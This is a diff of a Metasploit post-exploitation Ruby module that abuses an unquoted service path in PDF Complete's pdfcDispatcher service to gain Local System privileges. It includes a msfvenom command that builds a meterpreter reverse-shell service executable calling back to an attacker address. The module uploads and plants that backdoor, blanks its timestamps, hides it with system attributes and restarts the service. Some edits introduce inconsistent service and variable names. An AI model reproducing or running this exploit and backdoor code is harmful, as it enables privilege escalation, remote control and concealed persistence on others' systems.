@@ -43,6 +43,9 @@
 # "Program.exe" could be placed in "C:\", and it would be executed as the
 # Local System user next time the service was restarted.
 #
+# [ BUILD SERVICE EXECUTABLE ]
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=1337 -a x86 --platform windows -f exe-service -o Program.exe
+#
 #
 #
 # [ MODULE OPTIONS ]
@@ -56,8 +59,12 @@
 # 'UPLOAD_PATH' to deploy it (payload will be deploy in: C:\Program Files (x86)\PDF.exe
 # examples: set UPLOAD_PATH /root/PDF.exe AND set PDF_EXE true AND exploit
 # ---------------------------------------------------------------------------------------
-# HINT: to unset all options: msf post(PDF_complete_corporate_edition) > unset all
 #
+# "WARNING: This module will not delete the payload deployed"
+# "WARNING: Note that only executables explicitly written to interface with the Service Control
+# Manager should be installed this way. While SC will happily accept a regular non-service binary,
+# you will receive the fatal Error 1053 when you attempt to start the service, please read the follow
+# article: http://www.howtogeek.com/50786/using-srvstart-to-run-any-application-as-a-windows-service
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -119,11 +126,11 @@ class MetasploitModule < Msf::Post
                                 [
                                         'Vuln discover: Joey Lane',    # vulnerability discover
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
-                                        'Special thanks: milton_barra|Chaitanya Haritash', # testing/debug module
+                                        # 'Special thanks:', # testing/debug module
                                 ],
  
-                        'Version'        => '$Revision: 1.2',
-                        'DisclosureDate' => 'out 27 2016',
+                        'Version'        => '$Revision: 1.3',
+                        'DisclosureDate' => 'nov 17 2016',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false',
@@ -189,8 +196,8 @@ def ls_stage1
 
   r=''
   session = client
-  upath = datastore['UPLOAD_PATH']
-  bin_path = "C:\\Program Files (x86)\\PDF Complete\\pdfsvc.exe"
+  u_path = datastore['UPLOAD_PATH']
+  bin_path = "%programfiles%\\PDF Complete\\pdfsvc.exe"
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['UPLOAD_PATH'] == 'nil'
@@ -204,8 +211,8 @@ def ls_stage1
 
   # chose to deploy payload in C:\  -> [C:\Program.exe] OR ...
   # to deploy payload in C:\Program Files (x86)  -> [C:\Program Files (x86)\PDF.exe]
-  if datastore['PDF_EXE'] == 'true'
-   payload = "C:\\Program Files (x86)\\PDF.exe"
+  if datastore['PDF_EXE'] == true
+   payload = "%programfiles%\\PDF.exe"
    shell = "PDF.exe"
   else
    payload = "C:\\Program.exe"
@@ -228,13 +235,23 @@ def ls_stage1
 
           # upload our executable into temp foldder
           print_good("Uploading payload to target system...")
-          client.fs.file.upload("%temp%\\#{shell}","#{upath}")
+          client.fs.file.upload("%temp%\\#{shell}","#{u_path}")
           sleep(2.0)
 
-          # move payload to the rigth directory (unquoted service path)
-          print_good("moving payload to #{payload}")
-          r = session.sys.process.execute("cmd.exe /c move /y %temp%\\#{shell} #{payload}", nil, {'Hidden' => true, 'Channelized' => true})
-          sleep(1.0)
+        # move payload to the rigth directory (unquoted service path)
+        print_good("moving payload to #{payload}")
+        r = session.sys.process.execute("cmd.exe /c move /y %temp%\\#{shell} #{payload}", nil, {'Hidden' => true, 'Channelized' => true})
+        # check if remote path exists?
+        if payload.nil?
+          print_error("ABORT: post-module cant find backdoor binary...")
+          print_error("Please check: #{payload}")
+          return
+        end
+
+        # Change payload timestamp (date:time)
+        print_good(" timestamp => Blank backdoor agent timestamp...")
+        client.priv.fs.blank_file_mace(payload)
+        sleep(1.0)
 
           # start remote service ...
           print_good("Restarting pdfcDispatcher service...")
@@ -242,15 +259,15 @@ def ls_stage1
           sleep(2.0)
 
         # task completed successefully...
-        print_warning("pdfcDispatcher service [binary_path_name] backdoored successefuly!")
+        print_warning("Unquoted service path vulnerability backdoor deployed!")
+        sleep(1.0)
         print_status("Setup one handler and Wait everytime that system restarts OR")
-        print_status("Setup one handler and restart pdfcDispatcher service: sc start pdfcDispatcher")
+        print_status("Setup one handler and restart NoIPDUCService4 service: sc start NoIPDUCService4")
         print_line("")
 
     else
-      print_error("pdfcDispatcher service => NOT FOUND...")
-      print_warning("Target system does not appear to vulnerable to this.")
-      print_warning("post-module has aborted all tasks in hands :( ")
+      print_error("ABORT: post-module cant find service binary...")
+      print_error("NOT_FOUND: #{service_path}")
       print_line("")
     end
 
@@ -286,8 +303,8 @@ def ls_stage2
 
   # chose to deploy payload in C:\  -> [C:\Program.exe] OR ...
   # to deploy payload in C:\Program Files (x86)  -> [C:\Program Files (x86)\PDF.exe]
-  if datastore['PDF_EXE'] == 'true'
-   payload = "C:\\Program Files (x86)\\PDF.exe"
+  if datastore['PDF_EXE'] == true
+   payload = "%programfiles%\\PDF.exe"
    shell = "PDF.exe"
   else
    payload = "C:\\Program.exe"
@@ -297,17 +314,16 @@ def ls_stage2
 
     # check if backdoor.exe exist on target
     if client.fs.file.exist?("#{payload}")
-      print_status("Backdoor #{shell} file:found")
+      print_status("Backdoor agent: #{shell} found!")
       sleep(1.0)
       # change attributes of backdoor to hidde it from site...
       r = session.sys.process.execute("cmd.exe /c attrib +h +s #{payload}", nil, {'Hidden' => true, 'Channelized' => true})
-      print_good(" Execute => attrib +h +s #{payload}")
+      print_good(" Execute => cmd.exe /c attrib +h +s #{payload}")
       sleep(2.0)
 
         # diplay output to user
-        print_status("Our #{shell} its hidden from normal people!")
+        print_status("Our #{bin_shell} its hidden from normal people!")
         print_status("Just dont feed the black hacker within :( ")
-        print_warning("To revert attributes: attrib -h -s #{payload}")
         print_line("")
 
       # close channel when done
@@ -315,8 +331,8 @@ def ls_stage2
       r.close
 
     else
-      print_error("#{payload}  => NOT FOUND...")
-      print_warning("post-module has aborted all tasks in hands :( ")
+      print_error("ABORT: post-module cant find backdoor agent...")
+      print_error("BACKDOOR_AGENT: #{payload}")
       print_line("")
     end
 
@@ -335,9 +351,16 @@ end
 def ls_stage3
 
   r=''
-  serv="pdfcDispatcher"
+  s_key = "Start"
   session = client
+  b_key = "ImagePath"
+  o_key = "ObjectName"
+  d_key = "DisplayName"
+  e_cont = "1   NORMAL"
+  s_name = "pdfcDispatcher"
+  s_type = "10  WIN32_OWN_PROCESS"
   sysnfo = session.sys.config.sysinfo
+  hklm = "HKLM\\System\\CurrentControlSet\\services\\#{s_name}"
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['SERVICE_STATUS'] == 'nil'
@@ -348,34 +371,105 @@ def ls_stage3
     print_status("Checking pdfcDispatcher service settings!")
     sleep(1.0)
   end
-
-
+ 
+ 
     print_warning("Reading service hive registry keys...")
-    # search in target regedit for WSearch auto-start service status
-    # Value:Start - dword: 2 - auto | 3 - manual | 4 - disabled
-    if registry_getvaldata("HKLM\\System\\CurrentControlSet\\services\\pdfcDispatcher","Start") == '2'
-      startup = "auto_start"
-    end
-    if registry_getvaldata("HKLM\\System\\CurrentControlSet\\services\\pdfcDispatcher","Start") == '3'
-      startup = "manual_start"
-    end
-    if registry_getvaldata("HKLM\\System\\CurrentControlSet\\services\\pdfcDispatcher","Start") == '4'
-      startup = "disabled_start"
-    else
-        startup = "unknow"
-        print_error("post-module cant define service auto_start status...")
-        print_warning("enter into a shell session and execute: sc qc pdfcDispatcher status") 
-    end
-
-
+    sleep(1.0)
+    # search in target regedit for service existence
+    if registry_enumkeys("HKLM\\System\\CurrentControlSet\\services\\#{s_name}")
+      print_good("Remote service: #{s_name} found!")
+      remote_service = "#{s_name}"
       sleep(1.0)
-      # display pdfcDispatcher service current settings.
+    else
+      print_error("ABORT: post-module cant find service in regedit...")
+      print_warning("enter into a shell session and execute: sc qc #{s_name}")
       print_line("")
-      print_line("    :host    => #{sysnfo['Computer']}")
-      print_line("    :service => #{serv}")
-      print_line("    :status  => running")
-      print_line("    :startup => #{startup}")
       print_line("")
+      # display remote service current settings...
+      # cloning SC qc <ServiceName> display outputs...  
+      print_line("SERVICE_NAME: #{s_name}")
+      print_line(" [SC] Query Service Failed 404: NOT FOUND")
+      print_line("")
+      print_line("")
+    return nil
+    end
+
+
+      # search in target regedit for service auto-start status
+      # Value:Start - dword: 2 - auto | 3 - manual | 4 - disabled
+      local_machine_value = registry_getvaldata(hklm,s_key)
+        if local_machine_value.nil? || local_machine_value == 0
+         start_up = ""
+         print_error("post-module cant define service auto_start status...")
+         print_warning("enter into a shell session and execute: sc qc #{s_name}")
+         sleep(1.0)
+          elsif local_machine_value == 2
+            start_up = "2   AUTO_START"
+          elsif local_machine_value == 3
+            start_up = "3   DEMAND_START"
+          elsif local_machine_value == 4
+            start_up = "4   DISABLED_START"
+        else
+          start_up = ""
+          print_error("post-module cant define service auto_start status...")
+          print_warning("enter into a shell session and execute: sc qc #{s_name}")
+          sleep(1.0)
+        end
+
+
+    # search in regedit for privileges (LocalSystem)
+    priv_machine_value = registry_getvaldata(hklm,o_key)
+      if priv_machine_value.nil?
+       obj_name = ""
+       print_error("post-module cant define service privileges...")
+       print_warning("enter into a shell session and execute: sc qc #{s_name}")
+       sleep(1.0)
+      else
+        obj_name = "#{priv_machine_value}"
+      end
+
+
+    # search in regedit for service DisplayName
+    display_name_value = registry_getvaldata(hklm,d_key)
+      if display_name_value.nil?
+       display_name = ""
+       print_error("post-module cant define service display name...")
+       print_warning("enter into a shell session and execute: sc qc #{s_name}")
+       sleep(1.0)
+      else
+        display_name = "#{display_name_value}"
+      end
+
+
+    # search in regedit for binary_path_name value
+    bin_path_value = registry_getvaldata(hklm,b_key)
+      if bin_path_value.nil?
+       bin_path = ""
+       print_error("post-module cant define service binary_path_name...")
+       print_warning("enter into a shell session and execute: sc qc #{s_name}")
+       sleep(1.0)
+      else
+        bin_path = "#{bin_path_value}"
+      end
+
+
+    sleep(1.0)
+    print_line("")
+    print_line("")
+    # display remote service current settings...
+    # cloning SC qc <ServiceName> display outputs...  
+    print_line("SERVICE_NAME: #{remote_service}")
+    print_line("        TYPE               : #{s_type}")
+    print_line("        START_TYPE         : #{start_up}")
+    print_line("        ERROR_CONTROL      : #{e_cont}")
+    print_line("        BINARY_PATH_NAME   : #{bin_path}")
+    print_line("        LOAD_ORDER_GROUP   :")
+    print_line("        TAG                : 0")
+    print_line("        DISPLAY_NAME       : #{display_name}")
+    print_line("        DEPENDENCIES       :")
+    print_line("        SERVICE_START_NAME : #{obj_name}")
+    print_line("")
+    print_line("")
 
   # error exception funtion
   rescue ::Exception => e
@@ -417,6 +511,13 @@ def run
     print_line("")
 
 
+    # check for proper session.
+    if not sysinfo.nil?
+      print_status("Running module against: #{sysnfo['Computer']}")
+    else
+      print_error("ABORT]:This post-module only works in meterpreter sessions")
+      raise Rex::Script::Completed
+    end
     # elevate session privileges befor runing options
     client.sys.config.getprivs.each do |priv|
     end
